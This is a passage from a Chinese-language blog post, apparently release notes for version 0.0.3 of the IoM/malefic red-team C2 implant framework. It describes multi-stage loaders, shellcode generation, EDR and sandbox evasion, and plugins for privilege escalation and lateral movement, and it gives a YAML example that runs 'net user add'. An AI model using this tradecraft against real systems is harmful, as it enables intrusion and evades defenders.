\u4f1a\u6309\u6b21\u5e8f\u6267\u884c\u9884\u5148\u914d\u7f6e\u597d\u7684 modules, \u5168\u90e8\u901a\u8fc7\u540e\u5524\u518d\u5524\u8d77 beacon.</p> <p>\u6211\u4eec\u63d0\u4f9b\u4e86\u57fa\u4e8e yaml \u7684\u81ea\u52a8\u5316\u751f\u6210\u5668, \u80fd\u901a\u8fc7 yaml \u5feb\u901f\u751f\u6210\u4e0d\u540c\u573a\u666f\u4e0b\u7684 prelude \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6.</p> <p>yaml \u793a\u4f8b:</p> <pre><code>- name: bof\n  body: !ExecuteBinary\n    name: service\n    bin: !File \"addservice.o\"\n- name: exe\n  body: !ExecRequest\n    args:\n      - net\n      - user\n      - add\n      - ....\n</code></pre> <p>\u8fd9\u4e2a yaml \u80fd\u88ab\u81ea\u52a8\u6253\u5305\u7f16\u8bd1\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6.</p> <pre><code>malefic-mutant generate prelude autorun.yaml\n\ncargo build -p malefic-prelude\n</code></pre>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#pulse","title":"pulse","text":"<p>\u6211\u4eec\u901a\u8fc7\u6c47\u7f16+rust, \u5b9e\u73b0\u4e86 windows x86/x64 \u67b6\u6784\u7684 shellcode \u6a21\u677f, \u80fd\u751f\u6210\u6700\u5c0f 4kb \u7684\u53ef\u6267\u884c\u6587\u4ef6, \u5e76\u80fd\u8f7b\u6613\u8f6c\u4e3a shellcode.</p> <p>\u8fd9\u6bb5 shellcode \u5c06\u5728\u63d0\u6743/\u6a2a\u5411/\u521d\u59cb\u8bbf\u95ee\u7b49\u7b49\u8fc7\u7a0b\u4e2d\u88ab\u5927\u91cf\u4f7f\u7528.</p> <p>pulse \u901a\u8fc7 rust \u5185\u8054\u6c47\u7f16+rust \u7684 features \u63a7\u5236, \u5b9e\u73b0\u4e86\u4e00\u4e2a\u53ef\u63a7\u53ef\u7ec4\u88c5\u7684 shellcode factory , \u7528\u4ee5\u5b9e\u73b0\u9ad8\u5ea6\u5b9a\u5236\u5316\u7684 shellcode generator</p> <p>Cobaltstrike \u63d0\u4f9b\u4e86\u4e00\u4e9b kit, \u5176\u4e2d\u5c31\u6709 artifact kit, \u80fd\u63a7\u5236 stager \u7684\u751f\u6210, \u5e76\u5728\u5176\u4e2d\u8fdb\u884c\u4e00\u5b9a\u7a0b\u5ea6\u7684 EDR \u5bf9\u6297.</p> <p>\u540e\u7eed IoM \u8fd8\u4f1a\u57fa\u4e8e\u73b0\u5728 pulse \u7684\u57fa\u7840\u4e0a\u63d0\u4f9b\u4e00\u5957\u7c7b\u4f3c\u7684\u5de5\u5177, \u80fd\u8c03\u7528\u6211\u4eec\u5c01\u88c5\u8fc7\u7684 syscall, inject, cryptor \u7b49\u6d41\u7a0b, \u5feb\u901f\u5b9e\u73b0\u4e00\u4e2a shellcode \u52a0\u8f7d\u5668.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#mutant","title":"mutant","text":"<p>\u521a\u624d\u63d0\u5230\u4e86 implant \u4e2d\u591a\u4e2a\u65b0\u7684\u7ec4\u4ef6, \u4e3a\u4e86\u7ba1\u7406\u8fd9\u4e9b\u7ec4\u4ef6, \u4ee5\u53ca\u5b9e\u73b0\u81ea\u52a8\u5316/\u534a\u81ea\u52a8\u5316\u7f16\u8bd1, \u6211\u4eec\u5c06\u539f\u5148\u7684 malefic-config \u91cd\u6784\u4e3a malefic-mutant.</p> <p>malefic-mutant \u7684\u5b9a\u4f4d\u7c7b\u4f3c msf \u4e2d\u7684 venom, \u53ef\u4ee5\u8fdb\u884c rust \u4ee3\u7801\u751f\u6210, features \u914d\u7f6e, shellcode \u751f\u6210,SRDI \u7b49\u7b49\u7528\u9014. \u5e76\u4e14\u53ef\u4ee5\u8131\u79bb rust \u6e90\u7801, \u7f16\u8bd1\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6\u5355\u72ec\u4f7f\u7528.</p> <p>\u672a\u6765, \u8fd8\u4f1a mutant \u8fd8\u4f1a\u652f\u6301\u66f4\u591a\u7528\u9014, \u53d8\u6210 IoM \u7684\u6838\u5fc3\u7ec4\u4ef6\u4e4b\u4e00.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u591a\u9636\u6bb5\u52a0\u8f7d","title":"\u591a\u9636\u6bb5\u52a0\u8f7d","text":"<p>\u5728\u73b0\u4ee3\u5316\u7684\u653b\u9632\u573a\u666f\u4e2d, \u591a\u9636\u6bb5\u52a0\u8f7d\u5668\u662f\u591a\u4e2a APT \u7ec4\u7ec7\u7684\u5e38\u7528\u624b\u6cd5. \u53ef\u4ee5\u7ed9\u5206\u6790\u4eba\u5458\u5e26\u6765\u4e0d\u5c11\u7684\u56f0\u96be.</p> <p>IoM \u4e2d\u5b9e\u73b0\u4e86\u4e00\u6574\u5957\u6781\u9ad8\u81ea\u7531\u5ea6\u7684\u591a\u9636\u6bb5\u52a0\u8f7d\u65b9\u5f0f.</p> <p>\u9996\u5148, IoM \u7684\u5de5\u5177\u94fe\u53ef\u4ee5\u751f\u6210\u975e\u5e38\u591a\u4e0d\u540c\u7528\u9014\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <ul> <li>loader (stage0) \u7528\u6765\u52a0\u8f7d shellcode, \u8fd9\u90e8\u5206\u4e00\u822c\u662f\u7528\u6237\u5b9e\u73b0, \u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u7684 shellocde \u52a0\u8f7d\u5668\u4ee3\u66ff. \u5728\u5f53\u524d\u7248\u672c\u4e2d\u53ef\u4ee5\u4f7f\u7528 pulse(pulse \u9ed8\u8ba4\u6a21\u677f\u4e0d\u63d0\u4f9b\u514d\u6740)\u4f5c\u4e3a\u4e34\u65f6\u4ee3\u66ff</li> <li>prelude (stage1), \u4e2d\u95f4\u9636\u6bb5\u52a0\u8f7d\u5668, \u7528\u6765\u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5, \u6743\u9650\u7ef4\u6301\u7b49\u7b49\u529f\u80fd, \u662f\u6700\u5c0f\u5316\u7684\u672c\u4f53</li> <li>beacon/bind (stage2), \u56de\u8fde\u4e0e\u76d1\u542c\u6a21\u5f0f\u7684\u4e3b\u4f53\u7a0b\u5e8f, \u5230\u8fd9\u9636\u6bb5\u624d\u4f1a\u5f00\u59cb\u4e0e server \u4ea4\u4e92</li> <li>modules (stage3), \u53ef\u4ee5\u901a\u8fc7 config \u7f16\u8bd1\u4e00\u4e2a\u4e0d\u5e26\u4efb\u4f55\u529f\u80fd\u7684 beacon, \u7136\u540e\u5355\u72ec\u7f16\u8bd1 modules, \u5c06\u6240\u9700\u8981\u7684\u529f\u80fd\u901a\u8fc7 load_module \u547d\u4ee4\u52a8\u6001\u52a0\u8f7d</li> </ul> <p>\u5230\u8fd9\u4e00\u6b65. \u5e94\u8be5\u80fd\u53d1\u73b0 IoM, \u53ef\u4ee5\u6309\u9700\u5b9e\u73b0\u4efb\u610f\u573a\u666f\u7684\u6700\u5c0f\u5316\u52a0\u8f7d, \u5e76\u4e14\u5728\u4e0d\u540c\u9636\u6bb5\u4e4b\u95f4, \u901a\u8fc7\u6d41\u91cf\u6df7\u6dc6, \u52a0\u5bc6, \u5206\u79bb\u7b49\u7b49\u624b\u6bb5\u5c06\u6574\u4e2a\u4e0a\u7ebf\u8fc7\u7a0b\u53d8\u6210\u4e00\u4e2a\u6781\u957f\u7684\u6218\u7ebf.</p> <p>\u53ef\u4ee5\u5728\u4f7f\u7528 loader \u52a0\u8f7d prelude, \u518d\u901a\u8fc7 prelude \u52a0\u8f7d beacon, \u6700\u540e\u901a\u8fc7 load_module \u5206\u6279\u6309\u9700\u52a0\u8f7d\u6240\u9700\u7684\u529f\u80fd.</p> <p>\u4e5f\u53ef\u4ee5\u50cf Cobaltstrike \u7684 stageless \u4e00\u6837\u5b9e\u73b0\u4e00\u6b65\u5230\u4f4d\u7684\u672c\u4f53\u4e0a\u7ebf.</p> <p>\u4e0d\u540c\u9636\u6bb5\u4e4b\u95f4\u53ef\u4ee5\u4efb\u610f\u7ec4\u5408, \u4f8b\u5982\u4ece stage0-stage3, \u4e5f\u53ef\u4ee5 stage1-stage3.</p> <p>\u8fd9\u4e2a\u67b6\u6784\u4e0d\u4ec5\u5bf9\u6740\u8f6f/EDR \u6709\u5f88\u597d\u7684\u6297\u6027, \u5bf9\u6297\u4eba\u5de5\u5206\u6790\u4e5f\u6709\u975e\u5e38\u5927\u7684\u4f18\u52bf.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#bind-\u6a21\u5f0funstable","title":"bind \u6a21\u5f0f(Unstable)","text":"<p>\u5728\u5f53\u524d\u5b9e\u9645\u5bf9\u6297\u4e2d, \u53d7\u5230\u7f51\u7edc\u73af\u5883\u7684\u9650\u5236, \u5f88\u5c11\u6709\u4eba\u4f7f\u7528 bind \u7c7b\u578b\u7684 webshell. \u4f46\u5728\u4e00\u4e9b\u6781\u7aef\u573a\u666f\u4e0b, \u4f8b\u5982\u4e0d\u51fa\u7f51\u7684 webshell \u4e2d, \u53c8\u6216\u8005\u957f\u65f6\u95f4\u6d41\u91cf\u9759\u9ed8\u7684\u573a\u666f\u4e0b. bind \u4e5f\u8bb8\u6709\u7528\u6b66\u4e4b\u5730.</p> <p>\u5728\u91cd\u6784 malefic \u7684\u8fc7\u7a0b\u4e2d, \u4e5f\u4e3a\u4e86\u8fdb\u4e00\u6b65\u89e3\u8026, \u5b9e\u73b0\u4e86\u4e00\u4e2a demo \u7248\u672c\u7684 bind \u6a21\u5f0f\u7684 implant.</p> <p>bind \u6a21\u5f0f\u540c\u6837\u4e0d\u5efa\u7acb\u957f\u8fde\u63a5, \u5982\u679c\u4e0b\u53d1\u4e86\u4efb\u52a1, \u9700\u8981\u901a\u8fc7\u8f6e\u8be2\u83b7\u53d6\u4efb\u52a1\u7684\u8fd4\u56de\u503c. \u56e0\u4e3a\u4e3a\u7ecf\u8fc7\u5145\u5206\u6d4b\u8bd5, \u6211\u4eec\u4e5f\u6682\u65f6\u6ca1\u6709\u4e3a\u5176\u6dfb\u52a0\u6587\u6863. \u6709\u7279\u6b8a\u9700\u6c42\u7684\u7528\u6237\u53ef\u81ea\u884c\u5c1d\u8bd5.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u5176\u4ed6-implant-\u66f4\u65b0","title":"\u5176\u4ed6 implant \u66f4\u65b0","text":"<p>\u8fd9\u4e9b\u66f4\u65b0\u5e76\u975e\u4e0d\u91cd\u8981, \u5f88\u591a\u5185\u5bb9\u90fd\u8db3\u591f\u5355\u72ec\u5199\u4e00\u7bc7\u6587\u7ae0. \u53d7\u9650\u4e8e\u7bc7\u5e45, \u672c\u6587\u8be6\u7ec6\u4ecb\u7ecd\u7684\u5185\u5bb9\u53ea\u6d89\u53ca\u5230\u67b6\u6784\u5c42\u9762, \u5728 v0.0.3 \u540e, \u5c06\u4f1a\u901a\u8fc7\u4e00\u7cfb\u5217\u6587\u7ae0\u4ecb\u7ecd IoM \u76ee\u524d\u7684\u80fd\u529b.</p> <ul> <li>\u63d0\u4f9b\u4e86\u5185\u7f6e\u7684 SRDI</li> <li>\u652f\u6301\u5806\u6808\u6df7\u6dc6</li> <li>execute-assembly \u652f\u6301\u81ea\u52a8 patch exit</li> <li>execute-assembly \u652f\u6301 wldp bypass</li> <li>execute-assembly \u4fee\u590d\u6267\u884c\u5b8c\u6210\u540e\u6ca1\u6709\u6b63\u786e\u9000\u51fa\u7684\u95ee\u9898</li> <li>\u63d0\u4f9b\u4e86\u57fa\u4e8e AES\u3001XOR\u3001ChaCha20 \u7684\u6d41\u91cf\u52a0\u5bc6</li> <li>\u81ea\u52a8 compress spite\uff0c\u51cf\u5c11\u6d41\u91cf\u4f53\u79ef</li> <li>\u5141\u8bb8\u901a\u8fc7 feature \u63a7\u5236\u521d\u59cb\u5316\u65f6\u81ea\u52a8\u4fe1\u606f\u6536\u96c6\u4e0e hot_load \u529f\u80fd</li> <li>\u4fee\u590d\u4e86\u5927\u91cf modules bug, \u6d89\u53ca\u5230\u8fd1\u5341\u4e2a\u4e0d\u540c\u7684 module, \u5f88\u62b1\u6b49\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u51fa\u73b0\u4e86\u8fd9\u4e48\u591a bug</li> <li>\u517c\u5bb9 rust 1.74 \u7f16\u8bd1</li> <li>\u4fee\u590d linux implant \u7f16\u8bd1\u62a5\u9519, https://github.com/chainreactors/malefic/issues/8</li> <li>\u65b0\u6a21\u5757</li> <li>token \u64cd\u4f5c\u76f8\u5173</li> <li>\u8ba1\u5212\u4efb\u52a1\u76f8\u5173</li> <li>\u6ce8\u518c\u8868\u76f8\u5173</li> <li>\u670d\u52a1\u76f8\u5173</li> <li>WMI query \u4e0e execute</li> <li>\u547d\u540d\u7ba1\u9053\u76f8\u5173</li> <li>\u65b0\u7684 internal module, \u5305\u62ec init, suicide, ping, sleep</li> <li>\u89e3\u8026\u7f51\u7edc\u76f8\u5173\u64cd\u4f5c, \u80fd\u901a\u8fc7\u7b80\u5355\u4fee\u6539\u652f\u6301\u65b0\u7684\u534f\u8bae, \u4f5c\u4e3a\u5728 rem \u4e0a\u7ebf\u524d\u7684\u4e34\u65f6\u4ee3\u66ff</li> <li>\u652f\u6301\u81ea\u5b9a\u4e49 resources \u6587\u4ef6, \u53ef\u4ee5\u5b9e\u73b0\u66ff\u6362\u56fe\u6807, PE \u5143\u6570\u636e, \u8fdb\u7a0b\u540d\u7b49\u7b49</li> <li>addons \u76f8\u5173\u5185\u5bb9\u5b9e\u73b0\u4e86\u81ea\u52a8\u52a0\u89e3\u5bc6</li> <li>......</li> </ul> <p>v0.0.3 \u5b9e\u73b0\u7684\u65b0\u529f\u80fd\u6bd4\u6211\u4eec roadmap \u8ba1\u5212\u4e2d\u7684\u591a\u5f97\u591a. \u76f8\u4fe1\u73b0\u5728\u7684 malefic \u5df2\u7ecf\u662f\u529f\u80fd\u6700\u5f3a\u5927\u7684\u5f00\u6e90 implant, \u5e76\u4e14\u53ef\u4ee5\u5f88\u81ea\u4fe1\u7684\u8bf4**\u6ca1\u6709\u4e4b\u4e00**.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#server","title":"Server","text":""},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u81ea\u52a8\u5316\u7f16\u8bd1","title":"\u81ea\u52a8\u5316\u7f16\u8bd1","text":"<p>IoM \u76ee\u524d\u63a5\u6536\u5230\u7684\u6700\u591a\u7684\u53cd\u9988\u5c31\u662f\u7f16\u8bd1\u590d\u6742, \u7f16\u8bd1\u51fa\u73b0\u9519\u8bef, \u7f16\u8bd1\u73af\u5883\u96be\u914d\u7f6e.</p> <p>v0.0.2 \u4e2d,\u6211\u4eec\u5b9e\u73b0\u4e86\u57fa\u4e8e docker \u4e0e github action \u7684\u534a\u81ea\u52a8\u5316\u7f16\u8bd1, \u800c\u5728 v0.0.3 \u7740\u529b\u89e3\u51b3\u5168\u81ea\u52a8\u5316\u7f16\u8bd1.</p> <p>\u73b0\u5728 IoM \u53ef\u4ee5\u901a\u8fc7 client \u4e0a\u7684 build \u547d\u4ee4\u7ec4\u5b9e\u73b0 profile \u7ba1\u7406, \u81ea\u52a8\u5316 build, shellcode \u751f\u6210\u7b49\u7b49\u529f\u80fd.</p> <p></p> <p>\u53d7\u9650\u4e8e\u5f00\u53d1\u65f6\u95f4, \u6211\u4eec\u8fd8\u6ca1\u80fd\u5b9e\u73b0 100%\u7ec6\u7c92\u5ea6\u7684\u81ea\u52a8\u5316\u7f16\u8bd1, \u6240\u4ee5\u5bf9\u4e8e\u4e13\u4e1a\u7528\u6237\u6765\u8bf4, \u66f4\u63a8\u8350\u624b\u52a8\u8fdb\u884c\u7f16\u8bd1\u63a7\u5236, \u53ef\u4ee5\u4eab\u53d7\u5230\u6700\u5927\u7a0b\u5ea6\u7684\u5b9a\u5236\u7279\u6027.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u81ea\u5b9a\u4e49-parser-unstable","title":"\u81ea\u5b9a\u4e49 parser (Unstable)","text":"<p>\u5728\u65b0\u7684 server \u4e2d, \u6211\u4eec\u5c06 parser \u4ece\u4e2d\u89e3\u8026\u51fa\u6765. \u56e0\u4e3a IoM \u7684\u8ba1\u5212\u662f\u6210\u4e3a\u5f00\u653e\u7684\u57fa\u7840\u8bbe\u65bd, \u6211\u4eec\u4e0d\u60f3\u7ed1\u6b7b\u6211\u4eec\u7684\u901a\u8baf\u534f\u8bae. \u5e76\u4e14\u4e5f\u5728\u8ba1\u5212\u652f\u6301\u4e0d\u540c\u7684\u7b2c\u4e09\u65b9 C2. \u5728 v0.0.3 \u4e2d, \u6211\u4eec\u5b9e\u73b0\u4e86\u7b2c\u4e00\u6b65, \u5c06\u534f\u8bae\u89e3\u6790\u4e0e listener \u4e2d\u7684 pipeline \u89e3\u8026. \u53ef\u4ee5\u5728 pipeline \u4e2d\u914d\u7f6e\u4e0d\u540c\u7684 parser \u4ee5\u5b9e\u73b0\u4e0d\u540c\u7684 C2 \u534f\u8bae. \u5f53\u7136\u76ee\u524d\u4ec5\u652f\u6301\u4e86 malefic \u76f8\u5173\u534f\u8bae.</p> <pre><code>listeners:\n  name: listener\n  auth: listener.auth\n  enable: true\n  tcp:\n    - name: tcp_default\n      enable: true\n      port: 5001\n      host: 0.0.0.0\n      protocol: tcp\n      parser: malefic\n</code></pre> <p>\u5728\u4ee3\u7801\u4e2d, \u53ea\u9700\u8981\u5b9e\u73b0\u8fd9\u56db\u4e2a\u63a5\u53e3, \u5373\u53ef\u5b9e\u73b0\u4e00\u4e2a\u65b0\u7684 parser.</p> <pre><code>type PacketParser interface {\n    PeekHeader(conn *peek.Conn) (uint32, uint32, error)\n    ReadHeader(conn *peek.Conn) (uint32, uint32, error)\n    Parse([]byte) (*implantpb.Spites, error)\n    Marshal(*implantpb.Spites, uint32) ([]byte, error)\n}\n</code></pre>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#client","title":"Client","text":"<p>\u5728\u65e9\u671f\u8ba1\u5212\u4e2d, \u6211\u4eec\u8fd8\u8bd5\u56fe\u5b9e\u73b0 sleep \u8bed\u8a00\u7684\u63d2\u4ef6, \u4f46\u5728\u5b9e\u73b0\u8fc7\u7a0b\u4e2d, \u53d1\u73b0 cobaltstrike \u4e0e sleep \u8fc7\u5ea6\u8026\u5408, \u5f88\u96be\u5728\u8131\u79bb Cobaltstrike \u7684\u60c5\u51b5\u4e0b\u652f\u6301 sleep \u8bed\u8a00, \u8feb\u4e0d\u5f97\u5df2\u8f6c\u6362\u4e86\u601d\u8def, \u6211\u4eec\u5728 lua \u4e2d\u5b9e\u73b0\u4e86\u4e00\u7ec4 Cobaltstrike \u7684 aggressive script \u98ce\u683c</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#lua-\u63d2\u4ef6","title":"lua \u63d2\u4ef6","text":"<p>\u5728 v0.0.2 \u4e2d, IoM \u5c1d\u8bd5\u4f7f\u7528 lua \u5b9e\u73b0\u4e86\u4e00\u5957\u7c7b\u4f3c Cobaltstrike \u7684 Aggressive Script \u7684\u63d2\u4ef6\u8bed\u8a00. \u5e76\u5b9e\u73b0\u4e86\u4e09\u79cd API \u98ce\u683c\u7684\u5185\u7f6e\u51fd\u6570. \u5206\u522b\u4e3a Cobaltstrike \u98ce\u683c, IoM \u98ce\u683c\u4ee5\u53ca grcp \u98ce\u683c. \u5b9e\u9645\u4e0a\u662f\u540c\u4e00\u4e2a grpc \u7684\u4e09\u79cd\u4e0d\u540c\u5305\u88c5.</p> <p>\u5728 v0.0.3 \u6211\u4eec\u518d\u6b21\u91cd\u6784\u4e86 lua \u63d2\u4ef6\u811a\u672c, \u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684 api, \u5b8c\u5584\u4e86 lua \u7684\u5b9a\u4e49\u6587\u6863\u4e0e\u8bf4\u660e\u6587\u6863.</p> <p>\u73b0\u5728\u7684 lua \u63d2\u4ef6\u6709 140 \u4e2a builtin \u51fd\u6570, \u4ee5\u53ca\u5168\u90e8\u7684 grpc \u90fd\u6ce8\u518c\u5230\u4e86 lua \u4e2d, \u4e00\u5171 200 \u4e2a\u4e0d\u540c\u7528\u9014\u7684\u51fd\u6570, \u53ef\u4ee5\u901a\u8fc7 lua \u811a\u672c\u5b9e\u73b0\u5bf9 IoM \u6bcf\u4e2a\u64cd\u4f5c\u7684\u5b8c\u5168\u63a7\u5236.</p> <p>\u4e0e CS \u7684 cobaltstrike \u4e0d\u540c\u7684\u662f, IoM \u8fd8\u63d0\u4f9b\u4e86\u4f5c\u4e3a\u5e93\u7684\u63d2\u4ef6. \u4f8b\u5982\u6211\u4eec\u5b9e\u73b0\u4e86 No-Consolation, \u53ea\u9700\u8981\u5728 mal \u7684\u914d\u7f6e\u4e2d, \u5c06 lib \u8bbe\u7f6e\u4e3a true, \u5c06\u5141\u8bb8\u5c06\u8fd9\u4e2a\u6a21\u5757\u4f5c\u4e3a lib \u7ed9\u5176\u4ed6\u63d2\u4ef6\u5305\u4f7f\u7528.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u63d2\u4ef6\u4ed3\u5e93","title":"\u63d2\u4ef6\u4ed3\u5e93","text":"<p>\u5728 IoM \u7684\u8ba1\u5212\u4e2d, \u5305\u542b\u4e86 community-driver \u7684\u63d2\u4ef6\u7ba1\u7406\u7cfb\u7edf, \u5e76\u63d0\u4f9b\u4e86\u521d\u59cb\u7684\u63d2\u4ef6\u5305.</p> <p>\u63d2\u4ef6\u5305\u7d22\u5f15: https://github.com/chainreactors/mals</p> <p>\u9ed8\u8ba4\u63d2\u4ef6\u5305: https://github.com/chainreactors/mal-community</p> <p>\u6211\u4eec\u5c06\u4e00\u4e9b cobaltstrike \u4e2d\u88ab\u4f7f\u7528\u7684\u8f83\u591a\u7684\u63d2\u4ef6\u5305\u8fdb\u884c\u4e86\u8fc1\u79fb, \u4f7f\u7528 IoM \u7684 lua \u63d2\u4ef6\u7cfb\u7edf\u91cd\u5199, \u4e5f\u5bf9 IoM \u7684\u63d2\u4ef6\u7cfb\u7edf\u8fdb\u884c\u4e86\u80fd\u529b\u9a8c\u8bc1, \u7ed3\u679c\u8bc1\u660e, IoM \u7684\u63d2\u4ef6\u7cfb\u7edf\u5df2\u7ecf\u53ef\u4ee5\u5b9e\u73b0\u7edd\u5927\u591a\u6570 Aggressive Script \u7684\u529f\u80fd, \u5e76\u4e14\u62e5\u6709\u66f4\u5927\u7684\u81ea\u7531\u5ea6\u548c\u66f4\u4e30\u5bcc\u7684 lua \u5e93\u7684\u652f\u6301.</p> <p>\u76ee\u524d\u5df2\u7ecf\u8fc1\u79fb\u4e86\u975e\u5e38\u591a\u5de5\u5177\u5305:</p> <ul> <li>lib</li> <li>noconsolation, https://github.com/fortra/No-Consolation</li> <li>SharpBlock, https://github.com/CCob/SharpBlock</li> <li>common (\u57fa\u7840\u5de5\u5177)</li> <li>operatorskit, https://github.com/REDMED-X/OperatorsKit</li> <li>remoteopsbof, https://github.com/trustedsec/CS-Remote-OPs-BOF</li> <li>situationalbof, https://github.com/trustedsec/CS-Situational-Awareness-BOF</li> <li>chainreactor, gogo/zombie/spray \u7b49 chainreactor \u7684\u5de5\u5177</li> <li>elevate (\u63d0\u6743)</li> <li>move (\u6a2a\u5411\u79fb\u52a8)</li> <li>persistence (\u6743\u9650\u7ef4\u6301)</li> <li>proxy (\u7f51\u7edc/\u4ee3\u7406)</li> <li>domain(\u57df\u6e17\u900f)</li> </ul> <p>\u6211\u4eec\u5c06\u6211\u4eec\u63d0\u4f9b\u7684\u63d2\u4ef6\u5305\u5206\u4e3a\u4e86\u8fd9\u516d\u4e2a\u5927\u7c7b, \u5e76\u5728\u8fd9\u4e2a\u6846\u67b6\u4e2d\u586b\u5145\u66f4\u591a\u7684\u5185\u5bb9.</p> <p>\u63d2\u4ef6\u4ed3\u5e93\u7684\u7b2c\u4e00\u9636\u6bb5\u7684\u5de5\u7a0b\u8fc1\u79fb\u4e86\u6700\u5e38\u7528\u6700\u597d\u7528\u7684\u516c\u5f00\u7684\u5de5\u5177\u5305, \u8fd9\u4e9b\u5de5\u5177\u5927\u591a\u90fd\u662f\u5728 Cobaltstrike \u6846\u67b6\u4e2d\u8bbe\u8ba1\u7684, \u4e0b\u4e00\u9636\u6bb5, \u6211\u4eec\u4f1a\u6dfb\u52a0\u4e00\u4e9b\u66f4 opsec \u7684\u4e13\u4e3a IoM \u7279\u6027\u8bbe\u8ba1\u7684\u63d2\u4ef6.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#golang-\u63d2\u4ef6-unstable","title":"golang \u63d2\u4ef6 (Unstable)","text":"<p>client \u76ee\u524d\u8fd8\u901a\u8fc7 yaegi(\u4e00\u4e2a\u652f\u6301 golang \u8bed\u6cd5\u7684\u811a\u672c\u8bed\u8a00)\u5b9e\u73b0\u4e86\u57fa\u4e8e golang \u7684\u52a8\u6001\u63d2\u4ef6. \u662f\u9664\u4e86 lua \u4e4b\u5916\u7684\u53e6\u4e00\u4e2a\u9009\u62e9.</p> <p>\u76ee\u524d\u57fa\u4e8e yaegi \u5b9e\u73b0\u7684 golang \u63d2\u4ef6\u7cfb\u7edf\u8fd8\u672a\u7ecf\u8fc7\u5145\u5206\u4f7f\u7528, \u53ea\u8fdb\u884c\u4e86\u57fa\u672c\u7684\u6d4b\u8bd5. \u6682\u65f6\u4e0d\u63a8\u8350\u4f7f\u7528 golang \u7f16\u5199 IoM \u7684\u63d2\u4ef6.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#events-unstable","title":"events (Unstable)","text":"<p>\u5728 cobaltstrike \u7684 Aggressive Script \u4e2d\u6709\u4e00\u4e2a\u4e8b\u4ef6\u901a\u77e5\u4e0e\u56de\u8c03\u673a\u5236. https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_events.htm</p> <p>\u5728\u5b9e\u73b0 lua \u63d2\u4ef6\u65f6, \u6211\u4eec\u4e5f\u53c2\u8003\u8fd9\u5957\u673a\u5236\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u7684\u56de\u8c03\u673a\u5236\u3002</p> <p>\u5e76\u4e14\u6ce8\u518c\u4e86\u4e0e CobaltStrike \u4e2d\u7c7b\u4f3c\u7684 api. \u5f53\u7136\u5728 lua \u4e2d\u8bed\u6cd5\u4f1a\u6709\u4e9b\u533a\u522b</p> <pre><code>function on_beacon_initial(event)\n\n\u00a0 \u00a0 print(\"beacon init\")\n\nend\n</code></pre>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#opsec-\u6a21\u578b-unstable","title":"OPSEC \u6a21\u578b (Unstable)","text":"<p>\u5728\u5b9e\u73b0\u4e0a\u9762\u8fd9\u4e9b\u5185\u5bb9\u540e, \u6211\u4eec\u6709\u4e86\u65b0\u7684\u60f3\u6cd5, \u6211\u4eec\u60f3\u57fa\u4e8e ATT&amp;CK \u7684\u5a01\u80c1\u5efa\u6a21\u4ee5\u53ca CVSS \u7684\u8bc4\u5206\u6a21\u578b\u7684\u601d\u8def\u4e0a\u8bbe\u8ba1\u4e00\u5957\u7ea2\u961f\u89c6\u89d2\u7684 OPSEC \u8bc4\u5206\u6a21\u578b.</p> <p>\u901a\u8fc7\u56db\u4e2a\u7ef4\u5ea6\u7684\u8bc4\u5224\uff0c \u53c2\u8003 CVSS \u7684\u5206\u7ea7\u6807\u51c6\u3002</p> <p>\u8bc4\u5206\u8d8a\u9ad8\u8d8a\u5b89\u5168 , \u5177\u4f53\u8bc4\u5206\u4e3a\uff1a</p> <ul> <li>\u4f4e(0-3.9)\u64cd\u4f5c\u6781\u5176\u5bb9\u6613\u88ab\u68c0\u6d4b, \u660e\u663e\u75d5\u8ff9, \u9020\u6210\u6076\u6027(\u5931\u53bb\u7acb\u8db3\u70b9, \u7cfb\u7edf\u5d29\u6e83\u7b49)\u540e\u679c</li> <li>\u4e2d(4.0-6.9) \u64cd\u4f5c\u53ef\u80fd\u88ab\u68c0\u6d4b,\u75d5\u8ff9\u53ef\u63a7, \u540e\u679c\u53ef\u63a7</li> <li>\u9ad8(7.0-8.9) \u64cd\u4f5c\u57fa\u672c\u4e0d\u53ef\u80fd\u4e0d\u68c0\u6d4b, \u75d5\u8ff9\u8f83\u5c0f\u6216\u65e0\u75d5\u8ff9, \u88ab\u68c0\u6d4b\u4e5f\u4e0d\u4f1a\u6709\u660e\u663e\u540e\u679c</li> <li>OPSEC(9.0-10)\u5206, \u8fd9\u4e2a\u7ea7\u522b\u7684\u64cd\u4f5c\u88ab\u79f0\u4e3a OPSEC. \u51e0\u4e4e\u4e0d\u53ef\u80fd\u88ab\u68c0\u6d4b, \u6ca1\u6709\u75d5\u8ff9, \u4e0d\u4f1a\u9020\u6210\u540e\u679c.</li> </ul> <p>\u66b4\u9732\u5ea6 \u88ab EDR/NDR \u6216\u4efb\u610f\u8bbe\u5907\u68c0\u6d4b\u5230\u7684\u66b4\u9732\u7a0b\u5ea6</p> <ul> <li>\u662f\u5426\u6709\u65b0\u8fdb\u7a0b\u521b\u5efa</li> <li>\u662f\u5426\u6709\u65b0\u6587\u4ef6\u521b\u5efa</li> <li>\u662f\u5426\u6709\u65b0\u7f51\u7edc\u8fde\u63a5\u521b\u5efa</li> <li>\u662f\u5426\u9700\u8981\u8c03\u7528\u7cfb\u7edf api</li> <li>...</li> </ul> <p>\u75d5\u8ff9 \u88ab\u8ffd\u8e2a\u8fd8\u539f\u64cd\u4f5c\u75d5\u8ff9\u7684\u6210\u529f\u7387</p> <ul> 